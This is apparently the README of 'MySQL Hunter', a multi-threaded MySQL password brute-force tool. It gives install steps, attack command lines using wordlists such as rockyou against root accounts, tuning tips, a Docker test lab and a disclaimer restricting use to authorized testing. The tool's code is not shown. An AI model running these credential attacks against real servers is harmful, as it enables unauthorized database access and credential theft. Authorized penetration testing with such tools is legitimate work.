# 🎯 MySQL Hunter v1.0

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.7+-blue.svg" alt="Python">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg" alt="Platform">
  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License">
  <img src="https://img.shields.io/badge/Version-1.0-orange.svg" alt="Version">
</p>

<p align="center">
<pre>
   ███╗   ███╗██╗   ██╗███████╗ ██████╗ ██╗     
   ████╗ ████║╚██╗ ██╔╝██╔════╝██╔═══██╗██║     
   ██╔████╔██║ ╚████╔╝ ███████╗██║   ██║██║     
   ██║╚██╔╝██║  ╚██╔╝  ╚════██║██║▄▄ ██║██║     
   ██║ ╚═╝ ██║   ██║   ███████║╚██████╔╝███████╗
   ╚═╝     ╚═╝   ╚═╝   ╚══════╝ ╚══▀▀═╝ ╚══════╝

   ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
</pre>
</p>

<p align="center">
  <strong>A fast, multi-threaded MySQL brute-force tool with an interactive mode and beautiful progress visualization.</strong>
  <br><br>
  <strong>⚠️ For Educational and Authorized Penetration Testing Only ⚠️</strong>
</p>

---

## 📋 Table of Contents

- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
  - [Interactive Mode](#interactive-mode)
  - [Command-Line Mode](#command-line-mode)
- [Options](#-options)
- [Examples](#-examples)
- [Screenshots](#-screenshots)
- [Requirements](#-requirements)
- [Troubleshooting](#-troubleshooting)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🚀 **Multi-threaded** | Adjustable thread count for faster attacks |
| 🎨 **Beautiful UI** | Color-coded output with ASCII art banner |
| 📊 **Live Statistics** | Real-time speed, ETA, and progress tracking |
| 🔄 **Dual Mode** | Interactive prompts OR command-line arguments |
| 💾 **Auto-Save** | Found credentials saved to `hunter_results.txt` |
| 🛡️ **Error Handling** | Detailed error tracking and summary |
| ✅ **Pre-flight Checks** | Connection testing before attack starts |
| 📈 **Progress Bar** | Animated gradient progress visualization |

---

## 📦 Installation

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/mysql-hunter.git
cd mysql-hunter
```

### 2. Install Dependencies

```bash
pip install mysql-connector-python
```

Or install from requirements file:

```bash
pip install -r requirements.txt
```

### 3. Verify Installation

```bash
python mysql_hunter.py --help
```

---

## 🚀 Usage

### Interactive Mode

Run the script without any arguments to enter interactive mode:

```bash
python mysql_hunter.py
```

You'll be prompted to enter:

```
───────────────────────────────────────────────────────
  🎯 MySQL Hunter - Interactive Mode
───────────────────────────────────────────────────────

  [?] Target Host IP (e.g., 192.168.1.100): 192.168.1.100
  [?] MySQL Port (default: 3306): 3306
  [?] Username to attack (e.g., root): root
  [?] Wordlist path (e.g., wordlist.txt): /path/to/wordlist.txt
  [?] Number of threads (default: 10): 10
  [?] Database name (optional, press Enter to skip): 
  [?] Verbose mode? (y/N): n
```

### Command-Line Mode

For automation and scripting, use command-line arguments:

```bash
python mysql_hunter.py -H <host> -u <username> -w <wordlist> [options]
```

**Basic Example:**

```bash
python mysql_hunter.py -H 192.168.1.100 -u root -w wordlist.txt
```

**Full Example:**

```bash
python mysql_hunter.py -H 192.168.1.100 -P 3306 -u root -w rockyou.txt -t 20 -d mydb -v
```

---

## ⚙️ Options

| Option | Long | Description | Default | Required |
|--------|------|-------------|---------|----------|
| `-H` | `--host` | Target MySQL server IP address | - | ✅ |
| `-P` | `--port` | MySQL port number | `3306` | ❌ |
| `-u` | `--username` | Username to brute-force | - | ✅ |
| `-w` | `--wordlist` | Path to password wordlist file | - | ✅ |
| `-t` | `--threads` | Number of concurrent threads | `10` | ❌ |
| `-d` | `--database` | Target database name | `None` | ❌ |
| `-v` | `--verbose` | Show every login attempt | `False` | ❌ |
| | `--version` | Show version number | - | ❌ |

---

## 📝 Examples

### Attack localhost with default settings

```bash
python mysql_hunter.py -H 127.0.0.1 -u root -w passwords.txt
```

### Attack remote server with custom port

```bash
python mysql_hunter.py -H 10.10.10.50 -P 3307 -u admin -w wordlist.txt
```

### High-speed attack with 20 threads

```bash
python mysql_hunter.py -H 192.168.1.100 -u root -w rockyou.txt -t 20
```

### Attack specific database with verbose output

```bash
python mysql_hunter.py -H 192.168.1.100 -u dbuser -w wordlist.txt -d customers -v
```

### Using popular wordlists (Kali Linux)

```bash
# Uncompress rockyou first (if needed)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Run the hunt
python mysql_hunter.py -H 192.168.1.100 -u root -w /usr/share/wordlists/rockyou.txt -t 15
```

---

## 📸 Screenshots

### Banner & Configuration

```
   ███╗   ███╗██╗   ██╗███████╗ ██████╗ ██╗     
   ████╗ ████║╚██╗ ██╔╝██╔════╝██╔═══██╗██║     
   ██╔████╔██║ ╚████╔╝ ███████╗██║   ██║██║     
   ██║╚██╔╝██║  ╚██╔╝  ╚════██║██║▄▄ ██║██║     
   ██║ ╚═╝ ██║   ██║   ███████║╚██████╔╝███████╗
   ╚═╝     ╚═╝   ╚═╝   ╚══════╝ ╚══▀▀═╝ ╚══════╝

   ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

   ─────────────────────────────────────────────────────
       Fast Multi-Threaded MySQL Brute-Force Tool
              For Educational/Lab Use Only
                     Version 1.0
   ─────────────────────────────────────────────────────

───────────────────────────────────────────────────────
  🎯 Target Configuration
───────────────────────────────────────────────────────
  Host:     192.168.1.100:3306
  Username: root
  Database: Any
  Wordlist: wordlist.txt
  Threads:  10
  Verbose:  False

  [✓] Port 3306 is open
  [✓] MySQL responding (Access Denied = expected)
  [✓] Loaded 10,001 passwords
      Sample: admin, password, 123456...
```

### Progress Display

```
───────────────────────────────────────────────────────
  🔥 HUNT STARTED 🔥
───────────────────────────────────────────────────────

  [██████████████▓░░░░░░░░░░░░░░░] 45.2% 4,521/10,001 ⚡ 245.3/s ⏱ ETA: 22s → password123
```

### Target Captured (Password Found)

```
  ╔════════════════════════════════════════════════════════╗
  ║            🎯 TARGET CAPTURED! 🎯                      ║
  ╚════════════════════════════════════════════════════════╝

  Host:     192.168.1.100:3306
  Username: root
  Password: secretpass123

  Time: 45s | Attempts: 7,234 | Speed: 160.8/s

  [✓] Saved to hunter_results.txt
```

### Target Escaped (Password Not Found)

```
  ╔════════════════════════════════════════════════════════╗
  ║            ❌ TARGET ESCAPED ❌                        ║
  ╚════════════════════════════════════════════════════════╝

  Attempted: 10,001 passwords
  Time:      1m 23s
  Speed:     120.5 passwords/sec

  Error Summary:
    Error 1045 (Access Denied (normal)): 10,001

───────────────────────────────────────────────────────
  Thank you for using MySQL Hunter v1.0
  Happy Hunting! 🎯
───────────────────────────────────────────────────────
```

---

## 📋 Requirements

- **Python**: 3.7 or higher
- **Dependencies**:
  - `mysql-connector-python`

### requirements.txt

```
mysql-connector-python>=8.0.0
```

---

## 🔧 Troubleshooting

### Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `Cannot connect to host:port` | MySQL not running or firewall blocking | Start MySQL service, check firewall rules |
| `Error 2003 (Can't Connect)` | Server unreachable | Verify IP address, check network connectivity |
| `Error 1045 (Access Denied)` | Wrong credentials | This is normal during brute-force |
| `Error 2013 (Lost Connection)` | Server blocking rapid connections | Reduce threads with `-t 5` |
| `Error 1049 (Unknown Database)` | Database doesn't exist | Remove `-d` flag or use correct database name |
| `Wordlist not found` | Invalid file path | Check file path and permissions |

### Tips for Better Results

1. **Start with smaller wordlists** - Test with common passwords first
2. **Reduce threads if errors occur** - Some servers block rapid connections
3. **Check network connectivity** - Use `ping` and `nmap` to verify target
4. **Verify username exists** - Wrong username will never succeed
5. **Try without database flag** - Some MySQL configs don't require it

### Testing Your Setup

```bash
# Check if MySQL port is open
nmap -p 3306 <target-ip>

# Test manual connection
mysql -h <target-ip> -u root -p
```

---

## 🧪 Setting Up a Test Lab

### Using Docker (Recommended)

```bash
docker run -d \
  --name mysql-lab \
  -e MYSQL_ROOT_PASSWORD=password123 \
  -e MYSQL_USER=testuser \
  -e MYSQL_PASSWORD=letmein \
  -p 3306:3306 \
  mysql:8.0
```

### Test Credentials

| Username | Password |
|----------|----------|
| root | password123 |
| testuser | letmein |

### Sample Wordlist for Testing

Create `test_wordlist.txt`:

```
admin
password
123456
letmein
password123
root
mysql
```

### Run Test Hunt

```bash
python mysql_hunter.py -H 127.0.0.1 -u root -w test_wordlist.txt -t 5
```

---

## ⚠️ Disclaimer

```
╔══════════════════════════════════════════════════════════════════╗
║                         ⚠️ WARNING ⚠️                            ║
╠══════════════════════════════════════════════════════════════════╣
║  THIS TOOL IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY   ║
║  TESTING PURPOSES ONLY.                                          ║
║                                                                  ║
║  By using this tool, you agree to the following:                 ║
║                                                                  ║
║  1. You will only use this tool on systems you own or have       ║
║     explicit written permission to test.                         ║
║                                                                  ║
║  2. You understand that unauthorized access to computer systems  ║
║     is illegal and punishable by law in most jurisdictions.      ║
║                                                                  ║
║  3. The authors and contributors are not responsible for any     ║
║     misuse, damage, or illegal activities performed using        ║
║     this tool.                                                   ║
║                                                                  ║
║  4. You will comply with all applicable local, state, national,  ║
║     and international laws and regulations.                      ║
║                                                                  ║
║  USE RESPONSIBLY. ALWAYS GET PROPER AUTHORIZATION BEFORE TESTING.║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## 📞 Support

If you encounter any issues or have questions:

1. Check the [Troubleshooting](#-troubleshooting) section
2. Search existing [Issues](https://github.com/yourusername/mysql-hunter/issues)
3. Open a new issue with detailed information

---

## 🗺️ Roadmap

- [ ] PostgreSQL support
- [ ] MSSQL support
- [ ] SSH brute-force module
- [ ] FTP brute-force module
- [ ] Resume interrupted attacks
- [ ] Custom success detection rules
- [ ] Export results to JSON/CSV

---

<p align="center">
  <strong>Made with ❤️ for the cybersecurity community</strong>
  <br><br>
  <strong>⭐ Star this repo if you find it useful!</strong>
  <br><br>
  <strong>🎯 Happy Hunting! 🎯</strong>
</p>
